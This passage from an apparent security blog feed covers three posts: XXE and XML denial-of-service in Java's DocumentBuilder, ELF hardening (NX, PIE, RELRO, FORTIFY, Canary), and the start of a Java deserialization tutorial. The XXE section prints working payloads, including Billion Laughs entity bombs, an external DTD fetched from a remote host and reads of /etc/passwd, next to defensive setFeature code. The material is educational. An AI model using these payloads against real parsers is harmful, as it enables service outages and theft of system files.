id="（2）Billion-Laughs-攻击"><a href="#（2）Billion-Laughs-攻击" class="headerlink" title="（2）Billion Laughs 攻击"></a>（2）Billion Laughs 攻击</h4><p>经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">        &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">        &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/6.png" alt="demo"></p><p>当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://192.168.17.136:8000/dos.dtd&quot; [</span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;tea;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>在攻击者服务器放置dos.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY tea &quot;%a4;&quot; &gt;</span><br></pre></td></tr></table></figure><p>自己可更换低版本JDK进行测试，这里就不演示了。</p><h4 id="（2）支持实体测试"><a href="#（2）支持实体测试" class="headerlink" title="（2）支持实体测试"></a>（2）支持实体测试</h4><p>主要是利用普通实体ELEMENT，如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种DDoS攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（3）XML-二次爆破-DDoS-攻击"><a href="#（3）XML-二次爆破-DDoS-攻击" class="headerlink" title="（3）XML 二次爆破 DDoS 攻击"></a>（3）XML 二次爆破 DDoS 攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（4）一般实体递归"><a href="#（4）一般实体递归" class="headerlink" title="（4）一般实体递归"></a>（4）一般实体递归</h4><p>最好不要使用递归：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY a &quot;a&amp;b;&quot; &gt;</span><br><span class="line">&lt;!ENTITY b &quot;&amp;a;&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h4 id="（5）外部一般实体"><a href="#（5）外部一般实体" class="headerlink" title="（5）外部一般实体"></a>（5）外部一般实体</h4><p>这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或 /dev/random)。换句话说，就是让解析器解析一个 <strong>巨大的 XML 文件</strong>从而导致DoS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY dos SYSTEM &quot;file:///publicServer.com/largeFile.xml&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;dos;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="2、基本XXE攻击"><a href="#2、基本XXE攻击" class="headerlink" title="2、基本XXE攻击"></a>2、基本XXE攻击</h3><h4 id="有回显的XXE攻击"><a href="#有回显的XXE攻击" class="headerlink" title="有回显的XXE攻击"></a>有回显的XXE攻击</h4><p>这种攻击就是漏洞验证时利用的第3、4步的示例，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>但是这种攻击方式是需要一个直接的反馈通道即可以回显数据，并且读取文件受到XML中禁止字符的限制，如 “&lt;” 和 “&amp;”。如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。</p><h4 id="使用-netdoc-的-XXE-攻击"><a href="#使用-netdoc-的-XXE-攻击" class="headerlink" title="使用 netdoc 的 XXE 攻击"></a>使用 netdoc 的 XXE 攻击</h4><p>主要将file://换成netdoc:/，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;netdoc:/etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;file;&lt;/data&gt;</span><br></pre></td></tr></table></figure><h3 id="3、绕过基本XXE攻击的限制"><a href="#3、绕过基本XXE攻击的限制" class="headerlink" title="3、绕过基本XXE攻击的限制"></a>3、绕过基本XXE攻击的限制</h3><p>bypass.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file://e:/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.17.136:8000/bypass.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>bypass.dtd</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容；</p><p>2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>正确地设置setFeature()来进行防御，在创建出新的DocumentBuilderFactory实例之后就调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//防御XML注入</span></span><br><span class="line">        factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">        factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        DocumentBuilder builder = factory.newDocumentBuilder();</span><br><span class="line">        <span class="comment">//解析xml文档，先获取</span></span><br><span class="line">        Document doc = builder.parse(f);</span><br><span class="line">        <span class="comment">//通过user名字来获取dom节点</span></span><br><span class="line">        NodeList nodeList = doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">        Element e = (Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//获取值</span></span><br><span class="line">        System.out.println(<span class="string">"姓名："</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        System.out.println(<span class="string">"性别："</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        System.out.println(<span class="string">"年龄："</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次测试之前的payload，都没有成功：</p><p><img src="/2019/02/13/XML注入之DocumentBuilder/5.png" alt="demo"></p><p>至于setFeature()的详细配置可查阅：<a href="http://xerces.apache.org/xerces2-j/features.html" target="_blank" rel="noopener">http://xerces.apache.org/xerces2-j/features.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">DTD/XXE 攻击笔记分享</a></p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">XML外部实体（XXE）注入详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;何为DocumentBuilder&quot;&gt;&lt;a href=&quot;#何为DocumentBuilder&quot; class=&quot;headerlink&quot; title=&quot;何为DocumentBuilder&quot;&gt;&lt;/a&gt;何为DocumentBuilder&lt;/h2&gt;&lt;p&gt;DocumentBu
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>ELF安全防御机制小结</title>
    <link href="https://Mi1k7ea.github.com/2019/02/09/ELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/02/09/ELF安全防御机制小结/</id>
    <published>2019-02-09T03:30:47.000Z</published>
    <updated>2019-02-09T05:24:22.866Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。</p><h2 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（即Windows上类似的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>通常开启了NX后，即使有栈溢出漏洞也执行不了写在栈上的shellcode，但是可通过ROP方式来绕过NX跳转至其他地方执行。</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如：gcc -z execstack -o test test.c</p><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><p>网上找的示例图：</p><p><img src="/2019/02/09/ELF安全防御机制小结/1.jpg" alt="NX"></p><h2 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h2><p>PIE（Position-Independent Executables）位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。</p><p>一般情况下NX（DEP）和PIE（ASLR）会同时工作。</p><p>PIE机制有以下三种情况：</p><p>​         0 - 表示关闭进程地址空间随机化。</p><p>​         1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>​         2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域PIE。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程ROP（return-oriented programming）方法变得难得多。</p><p>liunx下关闭PIE的命令如下：sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>RELRO（Relocation Read Only）重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。通过设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，保护库函数的调用不受攻击者重定位的影响，从而减少对GOT（Global Offset Table）攻击。</p><p>RELRO有Partial RELRO和FULL RELRO两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。</p><p>可通过ROP绕过。</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>Fortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy,、memset等函数自动替换成相应的 __strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。</p><p>FORTIFY_SOURCE机制对格式化字符串有两个限制：</p><p>​    (1)包含%n的格式化字符串不能位于程序内存中的可写地址；</p><p>​    (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。</p><p>GCC中-D_FORTIFY_SOURCE=2是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。</p><p>如果指定-D_FORTIFY_SOURCE=1，那同样也要开启O1或以上优化，这个选项才会被真正激活。</p><p>可以使用-U_FORTIFY_SOURCE或者-D_FORTIFY_SOURCE=0来禁用。</p><p>如果开启了-D_FORTIFY_SOURCE=2，那么调用__printf_chk函数的时候会检查format string中是否存在%n，如果存在%n 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启-D_FORTIFY_SOURCE=1，那么就不会报错。</p><h2 id="CANARY（Stack）"><a href="#CANARY（Stack）" class="headerlink" title="CANARY（Stack）"></a>CANARY（Stack）</h2><p>Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。</p><p>Canary是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p><p>如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">Pwn基础知识笔记</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023?utm_source=blogxgwz8" target="_blank" rel="noopener">软件常用安全防护手段 checksec 总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。&lt;/p&gt;
&lt;h2 id=&quot;NX（DEP）&quot;&gt;&lt;a href=&quot;#NX（DEP）&quot; class=&quot;headerlink&quot; title=&quot;NX
      
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞</title>
    <link href="https://Mi1k7ea.github.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://Mi1k7ea.github.com/2019/02/06/Java反序列化漏洞/</id>
    <published>2019-02-06T04:14:03.000Z</published>
    <updated>2019-02-24T05:07:32.321Z</updated>
    
    <content type="html"><![CDATA[<p>在学习Java反序列化漏洞之前，建议先熟悉<a href="https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">Java序列化和反序列化机制</a>。</p><p>在反序列化漏洞中，Java类反序列化漏洞较PHP和Python的相比，显得稍微复杂一些。主要是要求对Java较为熟悉。下面小结一下Java反序列化漏洞的相关内容。</p><h2 id="何为Java反序列化漏洞"><a href="#何为Java反序列化漏洞" class="headerlink" title="何为Java反序列化漏洞"></a>何为Java反序列化漏洞</h2><p>当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。</p><p>Java反序列化中readObject()方法的作用相当于PHP反序列化中的魔术函数，使反序列化过程在一定程度上受控成为可能，是否真的可控，还需分析每个对象的readObject()方法具体是如何实现的。通常情况下，在Java的readObject()方法中很少会像CTF中PHP的反序列化漏洞题目一样直接将漏洞代码写在该方法中，这时就需要去构造反射链来进行任意代码执行。</p><h2 id="重写readObject-示例"><a href="#重写readObject-示例" class="headerlink" title="重写readObject()示例"></a>重写readObject()示例</h2><p>Java反序列化漏洞的根源在于重写readObject()方法导致存在漏洞代码。</p><p>readObject()方法重写的格式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>注意，readObject()方法被定义成了private，并且是必须尝试捕获IOException和ClassNotFoundException的异常。</p><p>这里再贴另外一个简单的示例，创建一个不安全的类对象，赋值其name属性并序列化为文件保存起来，接着通过反序列化该文件获取该对象及其属性值，通过重写readObject()方法在调用默认的readObject()方法之后添加一条执行计算器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]序列化对象"</span>);</span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]反序列化文件中保存的序列化对象"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"object.ser"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在readObject()方法调用时Java的序列化机制会先寻找用户是否自定义了readObject()方法，若有则直接调用该自定义的方法而非默认的readObject()方法：</p><p><img src="/2019/02/06/Java反序列化漏洞/1.png" alt="重写readObject()方法"></p><h2 id="Apache-Commons-Collections反序列化漏洞分析"><a href="#Apache-Commons-Collections反序列化漏洞分析" class="headerlink" title="Apache Commons Collections反序列化漏洞分析"></a>Apache Commons Collections反序列化漏洞分析</h2><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，包含了很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。</p><p>org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set、list、queue等等，它们是集合类型。换一种理解方式，collection是set、list、queue的抽象。</p><p>作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。</p><p>影响版本：3.2.1及以下版本的Commons Collections包。</p><p>下面就简单地模拟该序列化漏洞产生、payload的构造及利用过程。这里示例用的commons-collections-3.2.1.jar包。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>Apache Commons Collections中有一个特殊的接口Transformer，其中有一个实现该接口的类InvokerTransformer可以通过调用Java的反射机制来调用任意函数，其源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 